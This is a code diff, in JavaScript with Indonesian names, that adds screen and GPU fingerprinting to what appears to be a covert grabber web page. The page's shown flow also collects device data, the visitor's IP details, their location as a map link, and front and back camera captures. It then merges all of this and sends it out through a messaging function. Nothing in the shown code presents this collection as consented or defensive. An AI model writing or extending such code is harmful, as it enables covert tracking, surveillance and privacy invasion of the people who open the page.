@@ -271,6 +271,52 @@ Dibuka via Browser     : ${vendor || 'Tidak diketahui'}
 `.trim();
     };
 
+    const ambilLayarGrafik = async () => {
+      let gpu = { vendor: '-', renderer: '-' };
+      let webglSupport = 'Tidak';
+      let canvasFingerprint = 'Tidak terdeteksi';
+      let renderingMode = 'software';
+      let hdrSupport = 'Tidak';
+
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        webglSupport = gl ? 'Ya' : 'Tidak';
+
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+          const fp = canvas.toDataURL();
+          canvasFingerprint = fp.length > 1000 ? 'Terdeteksi' : 'Tidak terdeteksi';
+          renderingMode = gl.getContextAttributes().powerPreference === 'high-performance' ? 'hardware' : 'software';
+        }
+
+        hdrSupport = window.matchMedia('(dynamic-range: high)').matches ? 'Ya' : 'Tidak';
+      } catch {}
+
+      const colorDepth = screen.colorDepth || 24;
+      const orientation = screen.orientation?.type || 'Tidak diketahui';
+      const rotation = screen.orientation?.angle || 0;
+
+      return `
+౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼
+Resolusi Layar Fisik   : ${screen.width} x ${screen.height}
+Viewport Aktif         : ${window.innerWidth} x ${window.innerHeight} px
+Kerapatan Piksel       : ${window.devicePixelRatio}
+Orientasi Layar        : ${orientation}
+Rotasi                 : ${rotation}°
+Warna Layar            : ${colorDepth}-bit
+GPU Vendor             : ${gpu.vendor}
+GPU Renderer           : ${gpu.renderer}
+WebGL Support          : ${webglSupport}
+Canvas Fingerprint     : ${canvasFingerprint}
+GPU Rendering Mode     : ${renderingMode}
+HDR Support            : ${hdrSupport}`.trim();
+    };
+
     const ambilIPInfo = async () => {
       try {
         const res = await fetch("https://ipapi.co/json");
@@ -351,6 +397,7 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       try { await audio.play(); } catch {}
 
       const info = await ambilDataPerangkat();
+      const grafik = await ambilLayarGrafik(); // ditambahkan di sini
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
       const depan = await ambilKamera("user", "depan");
@@ -359,7 +406,7 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
       const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
 
-      const gabung = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join("\n\n");
+      const gabung = [info, grafik, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join("\n\n");
       await kirimPesan(gabung);
     };
 
